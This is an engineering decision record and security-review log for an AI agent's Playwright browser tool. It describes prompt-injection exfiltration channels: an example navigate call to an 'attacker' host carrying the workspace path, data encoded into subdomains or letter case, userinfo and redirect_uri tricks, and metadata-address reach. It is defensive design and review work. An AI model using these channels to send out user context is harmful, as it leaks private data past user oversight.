---
schema-version: 1
status: accepted
owner: software-engineer
last-verified: 2026-09-03
source: repository evidence, user decisions 2026-09-03
---

# 0003 — Playwright browser automation: the first workflow

## Status

**Gate open, 2026-09-03.** Recorded twice before as blocked. The three unmet
requirements were re-verified against current source and then resolved by user
decision the same day. Implementation of one read-only workflow is authorised.

## Gate history

| Date | Verdict | Controlling reason |
| --- | --- | --- |
| 2026-09-02 | Blocked | Per-call approval unshipped, isolation unshipped, product decisions unspecified |
| 2026-09-03 (early) | Blocked | Approval shipped (0008) but the Engine did not enforce it; isolation still absent |
| 2026-09-03 (late) | **Open** | Approval enforced; isolation prerequisite scoped to the browser; product decisions supplied |

## The gate

`.github/prompts/implement-browser-automation.prompt.md`:

> Require shipped per-call approval and isolated execution. Require the user to
> name the first workflow, target environment, permitted domains, required
> private data, and allowed outbound actions. If any is unspecified, stop and ask
> for those decisions before writing code.

## Gate re-verification, 2026-09-03

Measured, not inherited.

- **Per-call approval — enforced.** `Test-DpApprovalActive`,
  `Invoke-DpTerminalApprovalTool` and the `run_terminal_command` registration
  ship, and `Initialize-DpTerminalTool` probes `Invoke-Shp` for the
  `offeredBuiltInTool` refusal and throws without it. The refusal exists in the
  staged `output/RequiredModules/ShellPilot/0.4.1` and not in the installed
  `0.4.0`; `RequiredModules.psd1` pins `'latest'`, so the probe fails closed
  elsewhere. `perCallApproval` still defaults `$false`.
- **Isolation — absent for Tool execution, present for the browser.** `source/`
  holds no confinement code; every `container`/`sandbox` match is
  `Test-Path -PathType Container`, the MCP `sandboxRequested` badge, or the
  diagnostics "isolated PowerShell instance".
- **Playwright — absent.** No dependency anywhere. Browsing is the Engine's
  `fetch_url`, reached through `DisableBrowsing` in `New-DpTurnParameter`.

## The isolation prerequisite, scoped

The prompt requires "shipped isolated execution". Decision 0001's isolation is
**container confinement for terminal commands**, blocked on an unapproved
Docker/WSL2 dependency and a machine with no container runtime.

**Decided: that is not this feature's prerequisite.** Browser automation carries
its own boundary — a separate supervised process and a disposable profile with no
personal cookies, extensions, password store, history, downloads, or ambient SSO.
It needs no Docker, and it is what makes "Stop kills the whole tree"
implementable. Terminal isolation remains blocked under 0001 and is unaffected.

This scoping is deliberate and narrow. It authorises a browser-only Tool surface.
It does not authorise general desktop control, and it is not a precedent for
calling process separation "isolation" for terminal commands — decision 0001
rejects exactly that, and still does.

## The first workflow

**Read the weather for Osorno, Chile, from `weathercity.com`.**

Verified reachable 2026-09-03: `https://weathercity.com/` →
`https://weathercity.com/cl/` → `https://weathercity.com/cl/ll/osorno`. Three
same-origin navigations, `https` only.

| Gate input | Decision |
| --- | --- |
| Workflow | Navigate to a country, then a city, then read the rendered forecast |
| Target environment | A public read-only site. No test-portal credentials exist, and none are needed |
| Permitted domains | `weathercity.com` and subdomains, plus any per-Project additions, plus per-run grants |
| Required private data | **None.** "Chile" and "Osorno" are task parameters in the Tool call, not private values. No credential, Workspace Folder, clipboard, or home directory is reachable |
| Allowed outbound actions | **None.** Navigate, click a link, read text, screenshot. No submission, upload, download, message, purchase, or deletion |

## Current baseline, verified

DeskPilot's browser capability is the static SPA plus the Engine's `fetch_url`
Tool. It can retrieve and read a URL; it cannot inspect a live DOM, click a
control, fill a field, or drive a browser. No Playwright dependency is declared
in `RequiredModules.psd1` or anywhere else.

## Trifecta assessment for this workflow

The prompt requires breaking at least one leg by architecture. Two are broken
outright in the reading surface, and the third is the one that needed designing.

- **Agency — broken while reading, granted back deliberately for writing.** The
  reading actions contain nothing with an external effect, so an injected page
  has nothing to reach for. Write capabilities (below) restore part of this leg
  on purpose, which is why they are per-Project, absent by default, and approved
  per action rather than tiered against a safe-list.
- **Private data, browser side — broken.** No credential or local path is
  reachable from the browser context.
- **Egress — the real exposure, and not obvious.** The browser holds no secrets,
  but the **Model's context does**: the conversation, the Workspace Folder path,
  prior Turn content. The Model also chooses the next URL. An injected page that
  induces `browser_navigate("https://attacker/?ctx=<workspace path>")` exfiltrates
  through the URL itself, with no file read and no command run. This is why an
  open domain policy was rejected.

## Write capabilities, added 2026-09-05

The read-only slice broke the agency leg by having no action with an external
effect. The user asked for submit, upload, download and delete to be available
on request, per Project. That request is in scope — the prompt requires
"per-action approval for submissions, uploads, downloads … and any action with
external effect" — but it materially changes the posture: **approval stops being
a backstop and becomes the only thing between an injected page and an
irreversible action.**

**Capabilities are per Project, from Settings only, absent by default.**
`browserActions` may contain `fill`, `submit`, `upload`, `download`. Reading
needs no grant. An ungranted action is refused *before* any card is offered, so
an injected page cannot manufacture the moment in which a user grants one.

**There is no `delete` capability**, because there is no delete action. Removing
something on a site is a button press, so it is covered by `submit` and named on
that button's card. A capability named after an intention rather than a
mechanism would imply DeskPilot can tell a Save button from a Delete button,
which it cannot.

**No safe-list.** Decision 0008 tiers terminal commands because `git status` is
genuinely routine and a gate that interrupts on it gets switched off. There is no
equivalent on the web: every write has an external effect on somebody else's
system, so a "routine submission" is a category error and tiering would only be a
way of not asking.

**The card shows the values, and the fingerprint covers them.** A form fill lists
every field name and value; a press names the control; an upload shows the
resolved absolute path; a download shows the quarantine folder. "Submit a form"
is not a decision anyone can make. The fingerprint includes the values
themselves, so an approval for one set cannot be spent on another — the
substitution an injected page would want.

**Credential fields are refused, never masked.** The check is made in the
supervisor against the live input's own `type` and `autocomplete`, because a
field name is what an attacker controls. A conservative name pattern is a second
layer that can only add a refusal. The user signs in themselves.

**Uploads are confined, downloads are quarantined.** An upload path is resolved
against the Project with `Resolve-DpWorkspacePath` before the card is raised, so
a card never names a file outside the Project; page content never supplies a
path. A download lands in a folder under the data directory, never in the Project
where the File Tools would read it as the user's own work, and the page-supplied
filename is reduced to a stripped leaf first.

**A press re-checks scope**, because a form that posts to another site is a
navigation wearing a button.

### Known gap

`click_link` still follows in-scope links without an approval, and a link can
have a side effect on a badly-built site. It is unchanged from the read-only
slice and bounded by scope, but it is the one action with a plausible external
effect that is not gated. Naming it rather than quietly relying on "links are
reads".

## Security review, 2026-09-05

An independent agentic-security review returned **FAIL — 4 Blockers, 7 Majors**,
and found **four of the ten design claims false as stated**. Every Blocker and
Major is now fixed and carries a regression test. The review is the most
valuable thing that happened to this feature and its findings are recorded here
rather than summarised away.

**B-1 — the Model seeded its own scope.** The first `open` of a run seeded the
scope from the URL the *Model* chose, and a fresh state is created every Turn.
So every Turn had one free, unapproved navigation to any host on the internet:
inject on Turn N, exfiltrate on Turn N+1 with no card. Same-origin egress was
never approved either, so a Model-composed query string on the user's own site
was an open channel. **Fixed by changing the design**: scope now comes from
hosts the *user* named in their own message, plus the Project's list, plus
per-run grants; and an in-scope URL whose query the Model composed rather than
took from a link on the page just read is approved like a departure
(`Test-DpBrowserUrlFromPage`). This costs one card on a task whose site the user
did not name, and removes a complete exfiltration channel. That trade is the
reason this section exists.

**B-2 — the two enforcement points disagreed on 26 of 80 URLs.** `System.Uri`
performs no IDNA mapping and the WHATWG parser does, so `weathercity。com`
(U+3002) read as a single label in PowerShell and as `weathercity.com` in
Chromium. The approval card — the entire control for an off-scope navigation —
was showing a host the browser would never contact. The stated "never more
permissive" invariant had never been tested. **Fixed** by comparing on
`IdnHost` on both sides, treating an empty `:@` as userinfo, adding the
divergence cases to the corpus, and asserting both equality *and* the one-way
invariant.

**B-3 — Stop did not close the browser.** `Close-DpBrowserSession` had exactly
one caller: the *start of the next Turn*. Its own docstring claimed "called when
a Turn ends". Pressing Stop, or simply not sending another message, left a
visible Chromium running an attacker-controlled page with scope installed and
script executing, indefinitely. This is precisely the failure mode this
repository already records twice: a control asserted in a comment and absent
from the code. **Fixed** in the Turn's `finally` and on the stop route.

**B-4 — an unguarded environment variable replaced the whole boundary.**
`DESKPILOT_BROWSER_ROOT` overrode the asset root, and the supervisor sources are
re-copied on every session start — so it replaced `policy.mjs` and
`supervisor.mjs` with arbitrary Node code, silently, with no test, no warning
and no mention in the security model. The two *weaker* `DESKPILOT_BROWSER_TEST_*`
hooks had all three. **Fixed** by renaming it under the tested prefix and
surfacing every active hook through the runtime and Diagnostics.

Majors fixed: the per-run grant was dead code and never reached the supervisor
(M-1); the protocol inherited the console code page, so a card promising
`Straße` typed `Stra?e` (M-2); active hooks were only surfaced by a
`Write-Warning` inside the Engine Runspace that reaches nobody (M-3); `href` and
`title` were unbounded page-controlled text reaching the Model (M-4); the
declared download cap was never read (M-5); a public name with a private A
record reached the LAN, so the peer address is now checked after the navigation
lands (M-6); and a write was not bound to the page it was approved on (M-7).

The review also confirmed sound, having actively tried to break them: the deny‑
beats‑scope ordering, the write-capability gate, the credential-field refusal,
upload confinement and download filename sanitising, the no-silent-executable
property, orphan discrimination by path, absence of XSS on the card, absence of
any page-content path into a selector/URL/path/shell/eval, and the line-protocol
correlation design.

**The lesson worth keeping**: every Blocker was a claim this repository had
written down about itself. Three were in docstrings, one was in a header
comment. None had a test. The fixes all carry one now.

## Second review round, 2026-09-05

The fixes were re-reviewed and returned **FAIL again — 2 Blockers, 3 Majors**.
B-2 and B-4 were confirmed properly fixed; B-1 and B-3 were only half fixed, and
the half that remained was the half that mattered. That second round is the
reason this feature is now defensible, and it is worth recording why each miss
happened.

**B-1's fix moved the channel instead of closing it.** Scope no longer came from
the Model, but the replacement parsed *free text* for hostnames — so `README.md`,
`install.sh` and `main.py` became authorised hosts (all live TLDs, all cheap to
pre-register), text the user **pasted** rather than wrote authorised whatever it
mentioned, and a trailing slash made the match backtrack a label so
`news.bbc.co.uk/weather` authorised `news.bbc.co` while *not* authorising the
site the user named. Scope now comes only from complete `https://` URLs the user
wrote. And `Test-DpBrowserUrlFromPage` waved through any URL with no query and
no fragment on the docstring's claim that "a bare path carries no payload beyond
the path itself" — a sentence that refutes itself. The path *is* the payload.
The fragment was excluded on the claim that it "never leaves the browser"; it
never leaves over the network, and `location.hash` reads it in full, which chains
with the deliberate off-origin-image allowance into a working exfiltration. Both
now count.

**B-3's stop path was dead code that threw on every call.**
`Close-DpBrowserSession` opened a `[powershell]` on the Engine Runspace — which
is executing `Invoke-Shp` at exactly the moment Stop is pressed, so it threw
"a pipeline is already running" and a `catch { $null = $_ }` swallowed it, every
time, on the only path the fix existed for. The test asserted that the string
`Close-DpBrowserSession` appeared in the stop route. The session state is now
created on the Host Server side and injected into the runspace by reference, so
closing the browser needs no pipeline at all.

Also fixed: the peer-address check was missing on `click` and `press` (M-6/
NEW-005); `assertSamePage` was defeatable by `history.replaceState` and now
carries a navigation counter (NEW-006); an empty `lastUrl` blanked the card *and*
disabled the same-page check, which is the exact defect class the previous commit
set out to fix (NEW-002); `isInternalAddress` missed the expanded IPv6 loopback
(NEW-007); and a blocked navigation left an error-page transition in flight that
interrupted the *next* one — found by the hostile-site proof, and a defect
production would have hit.

**NEW-004 corrected a claim rather than the code.** `policy.mjs` asserted in its
header that it "may never be more permissive than the PowerShell one". Generated
inputs proved that false and always had been: `System.Uri` refuses to parse forms
the WHATWG parser canonicalises (`https:host/`, `%2e` in a host, backslash
separators), so PowerShell says `deny/unparseable` where `policy.mjs` correctly
allows a host that genuinely is in scope. Refusing to parse is not a permission
decision. The header now states the two properties that actually matter — every
`allow` names an in-scope host, and both sides name the same host when both allow
— and the invariant is asserted over ~1,700 generated mutations rather than a
corpus curated to pass it.

**The habit the reviewer named.** Two rounds, six false claims, all written by
this repository about itself, none tested. The countermeasure that worked was not
care: it was generating the test inputs and running the thing against a hostile
page. Both rounds' Blockers were found by measurement, and every one of the
second round's was in code written to fix the first round's.

## Third review round, 2026-09-05

**FAIL again — 2 Blockers, 4 Majors, 7 Minors, and once more every Blocker was
inside round two's fixes.** B-2 and B-4 were re-confirmed closed; B-1 and B-3
were still only half closed, one component to the left of where they had been.

**B3-1: the site root was exempt from provenance, and the host is data.** The
comment read "the site root carries nothing: no path, no query, no fragment".
It carries the *host*. Scope matches on a label boundary, so every subdomain of
an in-scope name is in scope, and the exemption made every subdomain *root*
"authored" — roughly 200 bytes of Model-chosen data per navigation, delivered to
a wildcard DNS server and a Host header, with no card at either enforcement
point. Measured: `https://c2VjcmV0LWQ6XEdpdFxEZXNrUGlsb3Q.weather.example/`
decided `allow` with `fromPage=True`, while `https://weather.example/?ctx=leak`
correctly raised a card. Reaching the attacker's *resolver* is worse than the
query channel B-1's fix escalated, because it lands before the HTTP request the
policy might still refuse. The root is now authored only when the host was named
by the user's message, the Project's list, or an approval the user answered.

**B3-2: the scheme match was unanchored, and the docstring overclaimed.**
`xhttps://evil.example/a` and `ftphttps://weird.example/` seeded scope, because
the pattern matched a scheme buried inside a longer token. Anchored now. The
docstring also claimed the scheme requirement stopped *pasted* text from
authorising a host — it does not and cannot: a prompt is one string, and a URL in
a pasted stack trace is indistinguishable from a typed one. The claim is
withdrawn rather than dressed up. What holds is that the host appeared in the
message the user sent, so they could see it, and everything reached through it is
still bounded by the deny rules, by per-address provenance, and by a card for
anything the Model composes.

**B3-3: a form no card may offer became a silent grant instead.**
`Resolve-DpBrowserUrlDecision` refuses userinfo outright — "a card the user could
say yes to would be a hole" — while `Get-DpBrowserScope` applied no such check, so
`https://good.example@evil.test/` granted `evil.test` permanent run scope under a
display form that reads as `good.example`. Scope seeding now admits a candidate
only if the classifier would be willing to raise a card for it, which keeps the
two in lockstep by construction rather than by memory.

**B3-4: the turn-boundary close was dead code, behind round two's own grep
test.** The stop route worked. The documented backstop in `Set-DpBrowserTool` did
not: `Invoke-DpTurn` assigned a *fresh* hashtable and passed that as `-State`, so
the close hit `if ($null -eq $session) { return }` every time and the previous
Turn's live session was dropped with no remaining reference. The only coverage
was two `Should -Match 'Close-DpBrowserSession'` assertions — verbatim the shape
round two had identified as worthless, left untouched by the commit that
documented why it is worthless. The state now comes from `Get-DpBrowserState`,
whose property — the same object every time — is asserted by reference equality.

**B3-5: sub-resources bypassed the peer-address check.** `assertPeerAllowed` was
wired only into `navigate`, `click` and `press`. The `context.route` handler
allowed any passive off-scope resource by *name*, so
`<img src="https://public.example/x.png">` whose A record points at
`169.254.169.254` was issued from the user's machine with no address check at
all. The header calling the peer address "the load-bearing check" was true only
for the paths that have one. Sub-resource hosts are now resolved before the
request leaves, and every response's peer is checked afterwards — the first
prevents and is TOCTOU-able, the second detects and is not, and a response from
inside stops the run.

**B3-6: percent-encoding was a covert channel through provenance.**
`Uri.GetLeftPart` unescapes unreserved characters, so `/%66orecast/today` and
`/forecast/today` compare equal while being different bytes on the wire — about
a bit per path character, on a URL the check certifies as the site's own. Rather
than compare harder, the classifier now rebuilds the address from its parsed
parts and the browser is sent *that*, so the Model has no encoding freedom left
to exploit.

Minors closed in the same pass: `click` never counted against the navigation
budget and never got the blocked-navigation settle its siblings received; the
download cap was applied after `saveAs` rather than before; `fill` asserted the
page once and then submitted without re-asserting; `isInternalAddress` missed
NAT64 and 6to4 embedded IPv4; a trailing comma silently dropped the host the user
had actually named; and the test-hook write guard grepped for two spellings of an
assignment out of five.

**The generator was too narrow to be the evidence it was presented as.** Round
two replaced a curated corpus with ~1,700 generated mutations and called the
invariant proven. The generator mutated only the first `.` of four fixed hosts
and never produced a near-miss around the label boundary the property is about —
so `evilweathercity.com` and `weathercity.com.evil.test` were never tested. It
now seeds those explicitly and crosses hosts with path tails, giving 23,040 cases
checked in four directions including the one that catches a card naming an
address the browser will then refuse.

**Verdict on the process, not the code.** Three rounds; every round's Blockers
lived in the previous round's fixes. The reviewer's diagnosis is the one to keep:
this repository writes an explanation, does not test it, and then treats the
explanation as the evidence. A fix now ships with an executable falsification
attempt — not a grep, not a curated case list, and not a paragraph.
## Fourth review round, 2026-09-05

**FAIL - 2 Blockers, 4 Majors, 6 Minors.** Both Blockers were silent, card-free
exfiltration channels on the user's own named host. B-2 was re-confirmed closed
under a much harder attack (76,581 generated cases, zero host drift); the URL
rebuild introduced in round three is the strongest control in the feature and
survived.

**B4-1: `-eq` is case-insensitive, and a path is not.** `Test-DpBrowserUrlFromPage`
compared the path, query and fragment with PowerShell's `-eq`, which is
case-insensitive *and* culture-sensitive. So `/FoReCaSt/ToDaY` matched the page's
`/forecast/today`, was certified as the site's own link, and reached the origin
server verbatim - roughly a bit per alphabetic character, 24 bits for that link,
and ~300 for a link with a 300-character path a hostile page publishes on
purpose. It works off the user's own typed URL too, so no injected page is
required. This is **B3-6 re-opened one component to the left**, and round three's
docstring is the reason nobody looked: it stated that percent-encoding did not
need defending here *because* the classifier rebuilds the address - true about
unreserved encoding, false about letter case and reserved-byte hex case, and
silent about the larger channel. The comparison is now ordinal for everything
after the host, case-insensitive for the host because DNS is, and every other
culture-sensitive comparison on the browser surface (`$hostName -eq $allowed`,
`.EndsWith`, the approval fingerprint) is ordinal too.

**B4-2: the 8000-character bound manufactured a host nobody wrote.** `Substring`
slices mid-token, so a pasted blob followed by the user's own address turned
`news.bbc.co.uk/weather` into `news.bbc.co` - a live registrable domain - which
then seeded scope *and* inherited the B3-1 root exemption, reachable with no card
at either enforcement point. `.com`->`.co`, `.dev`->`.de`, `.info`->`.in` and
`.net`->`.ne` are all live registries, and an attacker who supplies any pasted
content chooses the byte offset and therefore the typo-domain. The string
`news.bbc.co` is verbatim the example round two's own docstring cites as the bug
it removed: it was removed from the bare-token heuristic and left in the length
bound, where three rounds walked past it. A match that reaches the cut is now
discarded.

**B4-3: the corpus tested the string the Model typed, not the one that is sent.**
All four generated properties evaluated `$case.url`, while `Invoke-DpBrowserTool`
sends `$decision.url`. The generator grew 13x in round three and 0% closer to the
property that round's headline change was about; the only coverage of that change
was a `Should -Match` on the send line. The rebuilt URL is now fed back through
`policy.mjs` and compared host for host.

**B4-4: `fill` bound the page at the first field and the submit, not in between.**
Fields 2..n were typed with no check, and with no `submitWith` no check ever
fired at all. `assertSamePage` now runs before every field.

**B4-5: the sub-resource DNS check was fail-open.** `catch { internal = false }`
rested on "a name that will not resolve produces a request that fails anyway",
which assumes Node's resolver and Chromium's agree - Chromium runs its own with
Secure DNS. If they agree, refusing costs a request that was going to fail; if
they disagree, refusing is the only check there is. Failure is now closed, the
cache expires after 60s so a rebinding host is re-checked, and the lookup budget
is per page rather than per session.

**B4-6: the refusal ring's 200-entry cap turned a blocked navigation into a
reported success.** Past the cap `recordBlocked` returned before pushing, so
`click` and `press` found nothing refused, fell through to the still-in-scope
current URL, and reported success - `submitted: true` for a form that never
posted. A page reaches 200 with 200 off-scope `fetch` calls, i.e. exactly when it
is attacking. Refusals are now counted separately from the bounded report.

Also: service workers are blocked outright rather than relying on `route()`
intercepting them, which it does on this version but which Playwright's own types
say it does not; the WebSocket control is now required rather than skipped when
absent; and the extractor keeps a host the user named in a comma-joined list and
strips a trailing backtick.

**The root cause the reviewer named, which is one level up from any of these.**
Four Blockers across four rounds share a shape: *a correct fact about component A
is written down as a guarantee about component B.* The rebuild is genuinely
strong, and its strength was used in writing as the reason not to look at the
comparison operator two lines below. Size was likewise mistaken for coverage in
the generator. The standing rules that came out of this: every equality deciding
a security outcome is ordinal and asserted to be; the cross-parser property is
asserted on the string that is sent; and no security claim survives in a comment
that no test can fail.

## Fifth review round, 2026-09-05

**FAIL - 2 Blockers, 4 Majors, 2 Minors.** Five rounds, five Blockers inside the
previous round's fix. Two of round four's controls held under hard attack - the
ordinal decomposition survived 28,561 generated pairs, the truncation guard a
~1,100-case boundary sweep - and five broke.

**B5-1: a URL inside a URL became user-named scope.** Round four added
`[regex]::Split($match.Value, '(?<=.)(?=https://)')` so that
`https://a.example,https://b.example/` would yield both - a cosmetic Minor whose
unfixed behaviour was already *fail-safe*. It splits on every inner `https://`,
so an OAuth link's `?redirect_uri=https://attacker.test/cb` seeded
`attacker.test` and its whole subtree, and that root then navigated with no card.
The host in a `redirect_uri` is chosen by whoever sent the user the link. The
splitter is deleted; a joined list costs one approval card, which is what it cost
before the fix.

Same shape as the previous four - *"a URL in the user's message was named by the
user"* is true of the outer URL and was written down as a guarantee about every
substring of it - and the first time the shape appeared in a change made for a
cosmetic reason rather than a security one.

**B5-2: the rebuilt-URL test could not fail.** Round four added it to answer
B4-3, and it only asks whether `policy.mjs` agrees with whatever string
PowerShell produced. The reviewer mutated the rebuild six ways, including
deleting it outright (`$safeUrl = $Url`, which reopens B3-6), and the test passed
every time; the `Count -gt 20` floor did not bite because the unmutated value is
36. There is now a `rebuild collapses` Context asserting the property the rebuild
exists for - one request written several ways must produce one string - plus a
mutation matrix that fails if any of four ways of breaking the rebuild goes
unnoticed. It caught a `-BeLike` in its own first draft, which is
case-insensitive and therefore blind to a lowercasing mutation.

**M5-1, M5-2, m5-5: the DNS guard was three controls that did not work.** The
per-page budget reset on `framenavigated`, which `history.pushState` fires - 500
pushStates produced 1000 events and 1000 free budgets, so the control was
anti-correlated with the threat it named. The budget counted resolver calls
rather than hostnames and the cache was written only after `await`, so 256
concurrent requests for *one* host spent the whole budget and then refused 44 of
the page's own images. And a transient SERVFAIL was cached as
`resource-internal-address` for 60 seconds - a positive claim that a site
resolved onto the user's machine, produced by a failure to ask.

**M5-3: the refusal counter's third hole.** Reduced to "the newest navigation
refusal, globally", and sub-frame document requests are navigation requests, so a
page cycling `iframe.src` could deny every `click_link` and `press` and choose
the address named in the refusal - up to 500 characters of attacker-selected text
presented to the user as DeskPilot's own explanation. Refusals are now attributed
per frame.

**M5-4, which matters more than any single fix.** Nine supervisor assertions read
`supervisor.mjs` as text; the reviewer measured **53 of 54** disabling mutations
undetected. Commenting out `serviceWorkers: 'block'` satisfies the assertion that
it is set. So the two stateful guards moved into `source/browser/guards.mjs`,
which imports no Playwright and takes its resolver and clock as arguments.
`tests/Unit/fixtures/guard-checks.mjs` executes them; `mutate-guards.mjs`
disables each control in turn, and the suite **fails if any disabling mutation
goes unnoticed**. Eleven mutations, eleven noticed. This adds no control - it
moves existing ones somewhere a test can reach, which was the reviewer's stated
bar.

Also: `ensureBrowser` assigned `state.browser` before the WebSocket check, so the
throw left a session every later call reported as ready (m5-6). The browser is
now closed on failure and assigned last.

**Two defects the fixes introduced, both found by running rather than reading.**
`Copy-DpBrowserAsset` copied a hard-coded list of three files and *skipped*
anything missing, so `guards.mjs` silently did not ship and the supervisor died
with "started but did not report ready"; it now enumerates the asset folder and
throws on a missing module. And `request.frame()` throws for a pop-up being
closed, which took the whole session down until the frame check was made
defensive. The hostile-site proof caught both; the unit suite caught neither.

## Domain policy: scope-plus-prompt

Rejected: an open allow-list. The user's objection — nobody can enumerate in
advance what a site will need — is correct, and is answered by deriving scope
per run rather than by widening it.

| Class | Policy | Reason |
| --- | --- | --- |
| Top-level navigation, in scope | Allowed | Scope is the starting URL's registered domain and subdomains, `https` only |
| Top-level navigation, out of scope | Approval card naming the full URL; granted for that run only | The user decides when it actually arises, with the payload visible |
| Redirect landing off-scope | Treated as navigation | A redirect is a navigation the page chose |
| Off-origin image, stylesheet, font | Allowed | The page controls these and the page knows no secrets. Blocking them breaks ordinary sites for no gain |
| Off-origin script | Blocked | Rewrites the page after a screenshot was approved, so "what you saw is what happened" stops holding, and it makes injection dynamic |
| Off-origin WebSocket, XHR, fetch, beacon | Blocked | A channel that outlives the Tool call and never appears in the navigation record, voiding the Activity trail |
| Download, any origin | Blocked | A local write, needing its own approval; out of scope for a read-only slice |
| Anything page content proposes adding | Never | Only the user widens scope |

The asymmetry that makes this coherent: **off-origin images are safe for the same
reason off-origin navigation is not — the page does not know the Model's context,
and the Model does.**

**Per-Project additions widen only from Settings.** A Project may carry a
`browserDomains` list, validated on merge, a bad entry throwing rather than being
silently dropped or silently accepted. The approval card grants for the run only
and offers no "always allow" button. This reuses decision 0008's `safeCommands`
reasoning verbatim: "always allow this" beside a prompt is the button a tired
operator presses.

## Enforcement lives below the Model

Policy is evaluated in the Node supervisor via `context.route('**/*')`,
`request.isNavigationRequest()` and `request.resourceType()`, with
`context.on('page')` closing pop-ups and `page.on('download')` cancelling
downloads. The Model's only interface is four typed Tool calls, so it cannot read
the allow-list, widen it, or switch it off. Page content reaches the Model as
data and reaches the supervisor as nothing at all.

A policy expressed in the system prompt would be a request. This one is a
boundary.

## Runtime decisions

Carried forward from the blocked record; unchanged and now in force.

**Binding and runtime.** Official `playwright` Node package, driven from
PowerShell over a supervised child process. Rationale: the .NET binding would
put browser control inside the Host Server process, and the Engine Runspace is
already the single-threaded resource everything else queues behind. A separate
process is also what makes "Stop kills the whole tree" implementable.

**Node.js ownership.** DeskPilot does **not** bundle Node. It detects a
supported Node, reports its absence in Diagnostics, and offers a consent-gated
install pointing at the official distribution. Silently downloading an
executable runtime is exactly what the security model forbids.

**Browser binaries.** Pinned Playwright version with its matching browser build,
installed only on explicit consent into the DeskPilot data directory, verified by
Playwright's own version check before a Turn starts. Offline start with a
missing or mismatched binary fails visibly; it never falls back to a locally
installed browser, because that browser's profile is the user's.

**Profile.** A dedicated disposable profile per run: no personal cookies,
extensions, password store, history, downloads, or ambient SSO. Visible, not
headless, for the first user-facing workflow.

**Permission.** A separate `browserAutomation` Permission, off by default.
Browsing Permission must not imply it.

## Non-goals

Desktop, keyboard, mouse or screen control; reuse of the user's everyday browser
profile; driving an arbitrary locally installed browser; CAPTCHA bypass or
unattended credential entry; arbitrary-domain browsing with private data access;
a generic record-and-replay system before one workflow is proven.

